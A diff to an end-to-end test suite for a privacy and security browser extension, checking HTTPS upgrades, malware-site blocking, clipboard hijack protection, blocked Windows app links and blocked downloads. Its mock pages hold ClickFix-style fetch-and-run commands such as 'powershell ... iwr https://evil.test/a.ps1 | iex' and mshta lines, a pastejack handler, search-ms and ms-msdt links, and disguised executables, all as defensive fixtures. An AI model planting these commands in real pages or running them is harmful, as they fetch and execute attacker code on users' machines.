@@ -12,6 +12,7 @@
    Run: node tests/e2e/run.mjs   (Playwright from /opt/node22 or npm; Chromium under /opt/pw-browsers; openssl).
    Exits 1 on any failed check. */
 import https from 'node:https';
+import http from 'node:http';
 import fs from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
@@ -143,10 +144,12 @@ function handle(req, res) {
   log.push({ host, path: url.pathname, search: url.search, headers: req.headers, method: req.method, at: Date.now() });
   const p = url.pathname;
   if (host === 'check.torproject.org' && p === '/api/ip') { res.writeHead(200, { 'content-type': 'application/json', 'access-control-allow-origin': '*' }); res.end('{"IsTor":false,"IP":"198.51.100.7"}'); return; }
+  if (/(^|\.)(coinhive\.com|crypto-loot\.org|trycloudflare\.com)$/.test(host)) return html(res, `<!doctype html><p>${host}${p}</p>`);
   if (TRACKERS.includes(host) && !/^\/(land|page)$/.test(p)) {
     js(res, `window.realTrackers = (window.realTrackers || []).concat(${JSON.stringify(host + p)});`);
     return;
   }
+  if (p.startsWith('/files/')) { res.writeHead(200, { 'content-type': 'application/octet-stream', 'cache-control': 'no-store' }); res.end('test file ' + p); return; }
   switch (p) {
     case '/fp': return html(res, FP);
     case '/fpframe': return html(res, `<!doctype html><p>frame</p><script>${PROBE}</script>`);
@@ -184,11 +187,48 @@ function handle(req, res) {
     case '/check': return html(res, '<!doctype html><p>check</p>');
     case '/cookie': return html(res, '<!doctype html><p>cookie</p><script>localStorage.setItem("k", "v"); document.cookie = "js=1; path=/; max-age=3600; secure";</script>', { 'set-cookie': 'fp=1; Path=/; Secure; SameSite=Lax; Max-Age=3600' });
     case '/storage': return html(res, '<!doctype html><p>storage</p><script>window.stored = localStorage.getItem("k");</script>');
+    case '/miner': return html(res, '<!doctype html><p>has a miner</p><script src="https://crypto-loot.org/lib/miner.min.js"></script><script src="https://abc.trycloudflare.com/payload.js"></script><iframe src="https://coinhive.com/frame"></iframe>');
+    case '/frameblocked': return html(res, `<!doctype html><iframe src="chrome-extension://${url.searchParams.get('ext')}/blocked.html"></iframe>`);
+    case '/hard': return html(res, '<!doctype html><p>hardening</p>');
+    case '/clip': return html(res, `<!doctype html><html><body style="margin-top:220px">
+      <pre id="shown">curl -fsSL https://get.example.test/install.sh | sh</pre>
+      <p id="sel">hello world</p>
+      <textarea id="ta" style="position:absolute;left:-9999px">mshta https://evil.test/verify.hta # I am not a robot</textarea>
+      <button id="copyShown">Copy</button> <button id="copyHidden">Verify you are human</button> <button id="execHidden">Verify</button> <button id="pastejack">Copy greeting</button>
+      <script>
+        window.results = {};
+        const note = (k, v) => { window.results[k] = v; };
+        document.getElementById('copyShown').onclick = () => navigator.clipboard.writeText(document.getElementById('shown').textContent).then(() => note('shown', 'written'), e => note('shown', e.name + ': ' + e.message));
+        document.getElementById('copyHidden').onclick = () => navigator.clipboard.writeText('powershell -w hidden -c "iwr https://evil.test/a.ps1 | iex"').then(() => note('hidden', 'written'), e => note('hidden', e.name + ': ' + e.message));
+        document.getElementById('execHidden').onclick = () => { const t = document.getElementById('ta'); t.focus(); t.select(); note('exec', document.execCommand('copy')); };
+        document.addEventListener('copy', e => { if (!e.clipboardData) return; e.clipboardData.setData('text/plain', 'cmd /c start powershell -w hidden -c "irm evil.test/p | iex"'); e.preventDefault(); note('pjSet', e.clipboardData.getData('text/plain')); });
+        document.getElementById('pastejack').onclick = () => { const r = document.createRange(); r.selectNodeContents(document.getElementById('sel')); const s = getSelection(); s.removeAllRanges(); s.addRange(r); document.dispatchEvent(new ClipboardEvent('copy', { clipboardData: new DataTransfer(), bubbles: true, cancelable: true })); };
+      </script></body></html>`);
+    case '/links': return html(res, `<!doctype html><body style="margin:220px 0 0 12px;display:grid;gap:10px;justify-items:start">
+      <a id="sm" href="search-ms:query=invoice&amp;crumb=location:\\\\evil.test\\share">Open the invoice</a>
+      <a id="sp" href="ms-word:ofe|u|https://contoso.sharepoint.com/doc.docx">Open in Word</a>
+      <a id="ev" href="ms-word:ofe|u|https://evil.test/doc.docx">Open the document</a>
+      <button id="op">Fix the problem</button>
+      <script>window.clicked = []; document.addEventListener('click', e => window.clicked.push(e.target.id)); document.getElementById('op').onclick = () => { window.opened = window.open('ms-msdt:/id PCWDiagnostic /skip force'); };</script>`);
+    case '/dl': return html(res, `<!doctype html>
+      <a id="script" href="/files/report.js" download>report.js</a> <a id="prog" href="/files/setup.exe" download>setup.exe</a>
+      <a id="fake" href="/files/Chrome-Update.zip" download>Update Chrome</a> <a id="smug" download="invoice.pdf.exe">Invoice</a> <a id="txt" download="notes.txt">Notes</a>
+      <script>document.getElementById('smug').href = URL.createObjectURL(new Blob(['MZ not really a program'], { type: 'application/octet-stream' })); document.getElementById('txt').href = URL.createObjectURL(new Blob(['hello'], { type: 'text/plain' }));</script>`);
     default: return html(res, '<!doctype html><p>ok</p>');
   }
 }
-const server = https.createServer({ key: fs.readFileSync(path.join(TMP, 'key.pem')), cert: fs.readFileSync(path.join(TMP, 'cert.pem')) }, handle);
+/* plain.test has no secure version: its TLS handshake fails. */
+const server = https.createServer({ key: fs.readFileSync(path.join(TMP, 'key.pem')), cert: fs.readFileSync(path.join(TMP, 'cert.pem')), SNICallback: (name, cb) => (name === 'plain.test' ? cb(new Error('no https here')) : cb(null, null)) }, handle);
 await new Promise((resolve, reject) => { server.once('error', reject); server.listen(443, '127.0.0.1', resolve); });
+/* Plain HTTP, to see what (if anything) went out unencrypted. */
+const httpLog = [];
+const plainServer = http.createServer((req, res) => {
+  const host = (req.headers.host || '').replace(/:\d+$/, '').toLowerCase();
+  const url = new URL(req.url, 'http://' + host);
+  httpLog.push({ host, path: url.pathname });
+  html(res, `<!doctype html><p>plain http ${host}${url.pathname}</p>`);
+});
+await new Promise((resolve, reject) => { plainServer.once('error', reject); plainServer.listen(80, '127.0.0.1', resolve); });
 const U = (host, p) => `https://${host}${p}`;
 const seen = (host, pathname) => log.filter(l => l.host === host && (!pathname || l.path === pathname));
 
@@ -255,8 +295,8 @@ try {
   ok(st.scripts.length === 2 && st.scripts[0].id === 'outis-key' && st.scripts[0].world === 'ISOLATED' && st.scripts[1].id === 'outis-shield' && st.scripts[1].world === 'MAIN', 'the seed script and then the shield are registered', st.scripts);
   ok(st.scripts.every(s => s.allFrames && s.runAt === 'document_start' && s.fallback), 'both run at document_start in every frame, about:blank included');
   ok(JSON.stringify(st.scripts[1].js) === JSON.stringify(['inject/places/nowhere.js', 'inject/shield.js']), 'the default shield files: place Nowhere', st.scripts[1].js);
-  ok(st.rulesets.includes('trackers') && st.rulesets.includes('params'), 'tracker and link-cleaning rulesets on', st.rulesets);
-  ok(JSON.stringify(st.dynamic.sort()) === '[1,2,3,4]', 'header and referrer rules in place', st.dynamic);
+  ok(st.rulesets.includes('trackers') && st.rulesets.includes('params') && st.rulesets.includes('malware'), 'tracker, link-cleaning and malware rulesets on', st.rulesets);
+  ok(JSON.stringify(st.dynamic.sort((a, b) => a - b)) === '[1,2,3,4,5,6,7]', 'header, referrer and HTTPS rules in place', st.dynamic);
   ok(st.cookies.value === false && st.cookies.levelOfControl === 'controlled_by_this_extension', 'third-party cookies off (Chrome setting)', st.cookies);
   ok(st.rtc.value === 'default_public_interface_only', 'WebRTC limited to the public interface', st.rtc);
   ok(st.pings.value === false, 'hyperlink pings off');
@@ -492,8 +532,8 @@ try {
   await popup.goto(`chrome-extension://${id}/popup.html?tab=${await tabIdOf(tp)}`);
   await popup.waitForSelector('#host');
   await until(() => popup.evaluate(() => +document.getElementById('whoBig').textContent >= 9), 6000);
-  const pv = await popup.evaluate(() => ({ host: document.getElementById('host').textContent, pill: document.getElementById('sitePill').textContent, who: document.getElementById('whoBig').textContent, where: document.getElementById('whereBig').textContent, when: document.getElementById('whenBig').textContent, siteOn: document.getElementById('siteOn').checked, forget: document.getElementById('siteForget').checked }));
-  ok(pv.host === 'site-a.test' && pv.pill === 'Protected' && pv.siteOn && pv.forget, 'popup: the site and its switches', pv);
+  const pv = await popup.evaluate(() => ({ host: document.getElementById('host').textContent, pill: document.getElementById('sitePill').textContent, who: document.getElementById('whoBig').textContent, where: document.getElementById('whereBig').textContent, when: document.getElementById('whenBig').textContent, siteOn: document.getElementById('siteOn').checked, trust: document.getElementById('siteTrust').checked }));
+  ok(pv.host === 'site-a.test' && pv.pill === 'Protected' && pv.siteOn && !pv.trust, 'popup: the site and its switches', pv);
   ok(+pv.who >= 9 && pv.where === 'Hidden' && pv.when === 'UTC', 'popup: who, where, when', pv);
   await popup.click('#sees summary');
   await until(() => popup.evaluate(() => document.querySelectorAll('#seesTable tbody tr').length >= 9), 8000);
@@ -516,10 +556,10 @@ try {
   ok(pausedNow, 'popup: switching the site off pauses it');
   await popup.click('#siteOn');
   ok(await until(() => settings().then(s => !s.paused.length), 5000), 'popup: and back on');
-  await popup.click('#siteForget');
-  ok(await until(() => settings().then(s => s.kept.includes('site-a.test')), 5000), 'popup: "forget this site" off keeps it');
-  await popup.click('#siteForget');
-  ok(await until(() => settings().then(s => !s.kept.length), 5000), 'popup: and back on');
+  await popup.click('#siteTrust');
+  ok(await until(() => settings().then(s => s.kept.includes('site-a.test')), 5000), 'popup: "trust this site" keeps it');
+  await popup.click('#siteTrust');
+  ok(await until(() => settings().then(s => !s.kept.length), 5000), 'popup: and untrusting lets it be forgotten again');
   await popup.close();
 
   /* ---------------- 13. the settings page ---------------- */
@@ -559,6 +599,14 @@ try {
   const px = await until(() => bg(async () => { const p = await chrome.proxy.settings.get({}); return p.levelOfControl === 'controlled_by_this_extension' && p.value.mode === 'fixed_servers' ? { p: p.value, rtc: (await chrome.privacy.network.webRTCIPHandlingPolicy.get({})).value } : null; }), 5000);
   ok(px && px.p.rules.singleProxy.host === '127.0.0.1' && px.p.rules.singleProxy.port === 9150 && px.p.rules.singleProxy.scheme === 'socks5', 'proxy: Tor Browser preset applied', px);
   ok(px && px.rtc === 'disable_non_proxied_udp', 'proxy: WebRTC must then go through it', px && px.rtc);
+  await op.click('[data-chrome="chrome://settings/content/v8"]');
+  const v8 = await until(() => context.pages().find(p => p.url().startsWith('chrome://settings/content/v8')), 6000);
+  ok(!!v8, "settings: the zero-day checklist opens Chrome's V8 optimizer setting");
+  if (v8) await v8.close();
+  await op.bringToFront();
+  await op.click('#extCheck');
+  const em = await until(() => op.evaluate(() => document.getElementById('extMsg').textContent), 6000);
+  note('extension check in headless Chromium: ' + (em || 'the permission prompt got no answer'));
   await op.click('#proxyOn');
   ok(await until(() => bg(() => chrome.proxy.settings.get({})).then(p => p.levelOfControl !== 'controlled_by_this_extension'), 5000), 'proxy: off again, Chrome\'s own setting back');
   await op.evaluate(() => { window.scrollTo(0, 0); document.getElementById('toast').hidden = true; });
@@ -566,6 +614,170 @@ try {
   await op.screenshot({ path: path.join(OUT, 'options.png'), fullPage: true });
   await set({ kept: [] });
   await op.close();
+
+  /* ---------------- 15. safety ---------------- */
+  const sf = await bg(async () => ({
+    sb: await chrome.privacy.services.safeBrowsingEnabled.get({}),
+    notif: await chrome.contentSettings.notifications.get({ primaryUrl: 'https://never-visited.test/' }),
+    clip: await chrome.contentSettings.clipboard.get({ primaryUrl: 'https://never-visited.test/' }),
+    auto: await chrome.contentSettings.automaticDownloads.get({ primaryUrl: 'https://never-visited.test/' }),
+    rulesets: await chrome.declarativeNetRequest.getEnabledRulesets()
+  }));
+  ok(sf.sb.value === true && sf.sb.levelOfControl === 'controlled_by_this_extension', "safety: Chrome's Safe Browsing kept on", sf.sb);
+  ok(sf.notif.setting === 'block' && sf.clip.setting === 'block' && sf.auto.setting === 'block', 'safety: notification requests, clipboard reading and automatic downloads refused', sf);
+  ok(sf.rulesets.includes('malware'), 'safety: the malware ruleset is on');
+
+  /* HTTPS everywhere, except your own network */
+  const sp = await context.newPage();
+  watch(sp, 'safety');
+  await sp.goto('http://site-a.test/fp');
+  ok(sp.url() === 'https://site-a.test/fp' && !httpLog.some(l => l.host === 'site-a.test'), 'https: an http:// address opens over HTTPS and nothing goes out in the clear', sp.url());
+  await sp.goto('http://localhost/local');
+  ok(sp.url() === 'http://localhost/local' && httpLog.some(l => l.host === 'localhost' && l.path === '/local'), 'https: your own machine stays on plain HTTP');
+  await sp.goto('http://127.0.0.1/ip');
+  ok(sp.url() === 'http://127.0.0.1/ip', 'https: so do local addresses');
+  await sp.goto('http://plain.test/hello').catch(() => null);
+  ok(!!(await until(() => sp.url().startsWith(`chrome-extension://${id}/blocked.html`), 10000)), 'https: a site with no secure version gets the warning page', sp.url());
+  await sp.waitForSelector('#main:not([hidden])');
+  const ins = await sp.evaluate(() => ({ title: document.getElementById('title').textContent, what: document.getElementById('what').textContent, go: !document.getElementById('go').hidden }));
+  ok(/no secure version/.test(ins.title) && /plain\.test/.test(ins.what) && ins.go, 'https: it explains, and offers to continue', ins);
+  await Promise.all([sp.waitForURL('http://plain.test/hello', { timeout: 8000 }).catch(() => null), sp.click('#go')]);
+  ok(sp.url() === 'http://plain.test/hello' && httpLog.some(l => l.host === 'plain.test' && l.path === '/hello'), 'https: continuing opens it over HTTP', sp.url());
+  await sp.goto('http://plain.test/again');
+  ok(sp.url() === 'http://plain.test/again', 'https: and that choice holds for the session');
+  ok((await bg(() => chrome.declarativeNetRequest.getSessionRules().then(r => r.map(x => x.id)))).includes(100), 'https: as a session rule, gone after a restart');
+
+  /* known malware, scam-ad and mining sites */
+  await sp.goto('https://coinhive.com/').catch(() => null);
+  ok(!!(await until(() => sp.url().startsWith(`chrome-extension://${id}/blocked.html`), 8000)), 'malware: opening a known mining site shows the warning page', sp.url());
+  await sp.waitForSelector('#main:not([hidden])');
+  const mw = await sp.evaluate(() => ({ title: document.getElementById('title').textContent, what: document.getElementById('what').textContent, why: document.getElementById('why').textContent }));
+  ok(/dangerous site/.test(mw.title) && /coinhive\.com/.test(mw.what) && /cryptominers/.test(mw.what) && /processor/.test(mw.why), 'malware: it names the site and the danger', mw);
+  ok(!seen('coinhive.com').length, 'malware: nothing was fetched from it');
+  await Promise.all([sp.waitForURL('https://coinhive.com/', { timeout: 8000 }).catch(() => null), sp.click('#go')]);
+  ok(sp.url() === 'https://coinhive.com/' && seen('coinhive.com', '/').length === 1, 'malware: "open it anyway" opens it', sp.url());
+  const mp = await context.newPage();
+  const mark = log.length;
+  await mp.goto(U('site-b.test', '/miner'));
+  await sleep(600);
+  /* (Chrome itself may still fetch the favicon of the coinhive.com tab opened above; that is not this page.) */
+  const mhit = log.slice(mark).filter(l => /(^|\.)(crypto-loot\.org|trycloudflare\.com|coinhive\.com)$/.test(l.host) && l.path !== '/favicon.ico').map(l => l.host + l.path);
+  ok(mhit.length === 0, 'malware: miners, a mining frame and a tunnel script inside another site are all blocked (opening one site anyway lets nothing else through)', mhit);
+  await mp.goto('https://abc.trycloudflare.com/page');
+  ok(seen('abc.trycloudflare.com', '/page').length === 1, 'malware: a tunnel address still opens when you go to it yourself');
+  await mp.goto(`chrome-extension://${id}/blocked.html`);
+  await mp.waitForSelector('#main:not([hidden])');
+  const spoof = await mp.evaluate(() => ({ title: document.getElementById('title').textContent, go: document.getElementById('go').hidden }));
+  ok(/Nothing to show/.test(spoof.title) && spoof.go, 'the warning page opened by anyone else explains nothing and lets nothing through', spoof);
+  await mp.goto(U('site-a.test', '/frameblocked?ext=' + id));
+  const fb = await until(() => mp.frames().find(f => f.url().includes('blocked.html')), 5000);
+  ok(fb && (await fb.evaluate(() => document.getElementById('main').hidden).catch(() => true)), 'and it shows nothing at all inside a frame');
+  await mp.close();
+
+  /* the clipboard */
+  const cp = await context.newPage();
+  watch(cp, 'clipboard');
+  await cp.goto(U('site-a.test', '/clip'));
+  const cpTab = await tabIdOf(cp);
+  const kinds = async t => bg(x => chrome.storage.session.get('events').then(r => ((r.events || {})[x] || []).map(e => e.kind)), t);
+  await cp.click('#copyShown');
+  await sleep(500);
+  ok(!(await kinds(cpTab)).includes('clipboard') && (await cp.evaluate(() => !document.querySelector('outis-alert'))), 'clipboard: copying a command the page shows is allowed', await cp.evaluate(() => window.results));
+  await cp.click('#copyHidden');
+  await until(() => cp.evaluate(() => window.results.hidden), 4000);
+  const hid = await cp.evaluate(() => ({ r: window.results.hidden, banner: !!document.querySelector('outis-alert') }));
+  ok(/NotAllowedError/.test(hid.r) && hid.banner && (await kinds(cpTab)).includes('clipboard'), 'clipboard: a command the page hid is kept off the clipboard, with a warning on the page', hid);
+  await cp.click('#execHidden');
+  await sleep(300);
+  ok((await cp.evaluate(() => window.results.exec)) === false && (await kinds(cpTab)).filter(k => k === 'clipboard').length >= 2, 'clipboard: the older copy command too', await cp.evaluate(() => window.results));
+  await cp.click('#pastejack');
+  await sleep(300);
+  ok((await cp.evaluate(() => window.results.pjSet)) === '' && (await kinds(cpTab)).includes('pastejack'), 'clipboard: a page cannot swap what you copied for a command', await cp.evaluate(() => window.results));
+  ok((await bg(t => chrome.action.getBadgeText({ tabId: t }), cpTab)) === '!', 'the toolbar button turns to "!" in that tab');
+  const pop2 = await context.newPage();
+  watch(pop2, 'popup');
+  await pop2.goto(`chrome-extension://${id}/popup.html?tab=${cpTab}`);
+  await until(() => pop2.evaluate(() => document.querySelectorAll('#stopped li').length >= 3), 6000);
+  const card = await pop2.evaluate(() => ({ items: [...document.querySelectorAll('#stopped li')].map(li => li.textContent), pill: document.getElementById('safetyPill').textContent }));
+  ok(card.items.some(t => /hidden command/.test(t)) && card.items.some(t => /swapping/.test(t)) && /stopped/.test(card.pill), 'popup: the Safety card lists what was stopped', card);
+  await pop2.close();
+
+  /* links that open Windows tools */
+  const lk = await context.newPage();
+  watch(lk, 'links');
+  await lk.goto(U('site-a.test', '/links'));
+  for (const sel of ['#sm', '#ev', '#op', '#sp']) { await lk.click(sel, { noWaitAfter: true, timeout: 5000 }).catch(e => note('click ' + sel + ': ' + e.message.split('\n')[0])); await sleep(200); }
+  await sleep(300);
+  const lr = await lk.evaluate(() => ({ clicked: window.clicked, opened: window.opened === null ? 'null' : typeof window.opened }));
+  const lev = await bg(t => chrome.storage.session.get('events').then(r => ((r.events || {})[t] || []).map(e => e.kind + ' ' + e.detail)), await tabIdOf(lk));
+  ok(!lr.clicked.includes('sm') && !lr.clicked.includes('ev') && lev.includes('applink search-ms:') && lev.includes('applink ms-word:'), 'app links: search-ms: and an Office link to someone else\'s server are blocked', [lr, lev]);
+  ok(lr.clicked.includes('sp'), 'app links: an Office link to SharePoint still works', lr);
+  ok(lr.opened === 'null' && lev.includes('applink ms-msdt:'), 'app links: window.open to the troubleshooter is refused', [lr, lev]);
+  await lk.close();
+
+  /* hardening on sites you have not trusted */
+  const hardOf = async p => p.evaluate(async () => ({
+    gpu: navigator.gpu === undefined ? 'none' : 'present', wasm: typeof WebAssembly,
+    lock: navigator.keyboard ? await navigator.keyboard.lock().then(() => 'locked', e => e.name + ': ' + e.message) : 'n/a',
+    notif: await Promise.race([Notification.requestPermission(), new Promise(r => setTimeout(() => r('no answer'), 2500))])
+  }));
+  const hz = await context.newPage();
+  watch(hz, 'hardening');
+  await hz.goto(U('site-a.test', '/hard'));
+  const h1 = await hardOf(hz);
+  await set({ kept: ['site-b.test'] });
+  ok((await bg(async () => (await chrome.scripting.getRegisteredContentScripts()).map(x => x.id))).includes('outis-shield-trusted'), 'hardening: a trusted site gets its own page-script registration');
+  await hz.goto(U('site-b.test', '/hard'));
+  const h2 = await hardOf(hz);
+  ok(h1.gpu === 'none' && /not allowed on this site/.test(h1.lock) && h1.notif === 'denied', 'hardening: an untrusted site gets no WebGPU, no keyboard lock and no notification prompt', h1);
+  const askB = await bg(() => chrome.contentSettings.notifications.get({ primaryUrl: 'https://site-b.test/' }).then(r => r.setting));
+  ok(!/not allowed on this site/.test(h2.lock) && askB === 'ask', 'hardening: a trusted site keeps keyboard lock and may ask to send notifications', [h2, askB]);
+  if (h2.gpu === 'present') ok(true, 'hardening: (WebGPU is there on the trusted site)'); else note('this Chromium has no WebGPU, so only its removal on untrusted sites is shown');
+  ok(h1.wasm === 'object', 'hardening: WebAssembly stays unless you choose otherwise');
+  await set({ wasm: true });
+  await hz.goto(U('site-a.test', '/hard'));
+  const h3 = await hardOf(hz);
+  await hz.goto(U('site-b.test', '/hard'));
+  const h4 = await hardOf(hz);
+  ok(h3.wasm === 'undefined' && h4.wasm === 'object', 'hardening: with "also WebAssembly" it is gone on untrusted sites, kept on trusted ones', [h3.wasm, h4.wasm]);
+  await set({ wasm: false, kept: [] });
+  ok(!(await bg(async () => (await chrome.scripting.getRegisteredContentScripts()).map(x => x.id))).includes('outis-shield-trusted'), 'hardening: no trusted sites, no trusted registration');
+  await hz.close();
+
+  /* downloads */
+  const dlDir = path.join(TMP, 'dl');
+  fs.mkdirSync(dlDir, { recursive: true });
+  const dp = await context.newPage();
+  watch(dp, 'downloads');
+  const dcdp = await context.newCDPSession(dp);
+  await dcdp.send('Browser.setDownloadBehavior', { behavior: 'allow', downloadPath: dlDir, eventsEnabled: false });
+  await dp.goto(U('site-a.test', '/dl'));
+  const files = () => fs.readdirSync(dlDir).filter(f => !f.endsWith('.crdownload')).sort();
+  await dp.click('#script');
+  const wp = await until(() => context.pages().find(p => p.url().includes('blocked.html#d=')), 10000);
+  ok(!!wp, 'downloads: a script from a website is stopped, and a warning tab explains it');
+  if (wp) {
+    watch(wp, 'warning');
+    await wp.waitForSelector('#main:not([hidden])');
+    const wv = await wp.evaluate(() => ({ title: document.getElementById('title').textContent, facts: document.getElementById('facts').textContent, why: document.getElementById('why').textContent, go: !document.getElementById('go').hidden }));
+    ok(/stopped a download/.test(wv.title) && /report\.js/.test(wv.facts) && /site-a\.test/.test(wv.facts) && /runs as soon as you open it/.test(wv.why) && wv.go, 'downloads: the warning names the file, where it came from and why', wv);
+    await sleep(400);
+    ok(!files().includes('report.js'), 'downloads: the file is not on disk', files());
+    await wp.click('#go');
+    ok(!!(await until(() => files().includes('report.js'), 8000)), 'downloads: "download it anyway" fetches it once more', files());
+  }
+  await dp.bringToFront();
+  for (const sel of ['#prog', '#fake', '#smug', '#txt']) { await dp.click(sel); await sleep(700); }
+  await until(() => files().includes('notes.txt') && files().includes('setup.exe'), 6000);
+  await sleep(1200);
+  const got = files();
+  ok(got.includes('setup.exe') && got.includes('notes.txt'), 'downloads: an ordinary program and a text file a page made download normally', got);
+  ok(!got.includes('Chrome-Update.zip') && !got.includes('invoice.pdf.exe'), 'downloads: a fake browser update and a disguised program the page built are deleted', got);
+  const dEvents = await bg(() => chrome.storage.session.get('events').then(r => Object.values(r.events || {}).flat().filter(e => e.kind === 'download').map(e => e.detail)));
+  ok(dEvents.includes('Chrome-Update.zip') && dEvents.includes('invoice.pdf.exe') && dEvents.includes('report.js'), 'downloads: each one is noted', dEvents);
+  await dcdp.send('Browser.setDownloadBehavior', { behavior: 'default' }).catch(() => null);
+  await dp.close();
+  if (wp) await wp.close().catch(() => null);
 
   /* ---------------- 14. a new session ---------------- */
   await page.goto(U('site-a.test', '/fp'));
@@ -594,6 +806,7 @@ try {
 } finally {
   try { await context.close(); } catch (e) { /* closed */ }
   server.close();
+  plainServer.close();
   try { fs.rmSync(TMP, { recursive: true, force: true }); } catch (e) { /* ignore */ }
 }
 console.log(checks.join('\n'));
